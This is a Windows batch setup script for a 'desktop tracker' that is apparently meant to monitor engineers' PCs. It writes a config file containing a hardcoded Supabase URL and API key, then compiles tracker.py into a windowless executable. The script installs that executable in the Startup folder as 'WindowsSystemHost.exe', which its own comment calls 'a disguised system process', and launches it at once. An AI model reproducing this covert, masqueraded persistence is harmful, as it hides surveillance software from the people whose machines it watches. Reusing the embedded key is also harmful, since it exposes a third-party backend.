@echo off
setlocal
echo ===================================
echo DEC Desktop Tracker Setup
echo ===================================

:: Ensure running in the correct directory
cd /d "%~dp0"

echo This script will configure the background tracker for a specific engineer
echo and add it to the Windows Startup folder so it runs automatically.
echo.

set /p ENGINEER_ID="Enter Engineer ID for this PC: "
if "%ENGINEER_ID%"=="" (
    echo Error: Engineer ID cannot be empty!
    pause
    exit /b 1
)

echo Generating config.py...
echo ENGINEER_ID = '%ENGINEER_ID%' > config.py
echo SUPABASE_URL = 'https://wvzfjhovumhwlrcawcwf.supabase.co' >> config.py
echo SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Ind2emZqaG92dW1od2xyY2F3Y3dmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzE1MDM0MjIsImV4cCI6MjA4NzA3OTQyMn0.MbDtyyPPl3d_HQ7-qwYjYOFnSl6aS69GQCHhd6sjG-c' >> config.py

echo.
echo Installing python dependencies...
pip install -r requirements.txt
pip install pyinstaller

echo.
echo Building standalone Executable...
:: --noconsole hides the python window
:: --onefile outputs an easy to move single .exe file
:: --clean removes cached files to ensure a clean build
pyinstaller --noconsole --onefile --clean tracker.py

if not exist "dist\tracker.exe" (
    echo Error: Failed to compile the executable! Make sure Python is installed correctly.
    pause
    exit /b 1
)

echo.
echo Installing to Windows Startup folder...
:: Copy the resulting tracker.exe into the active user's Startup folder as a disguised system process
copy /Y "dist\tracker.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.exe"

echo.
echo Setup Complete! The tracker will now start automatically in the background every time the PC boots.
echo.
echo Starting the tracker right now so you don't have to restart...
start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsSystemHost.exe"

pause
endlocal
exit /b 0
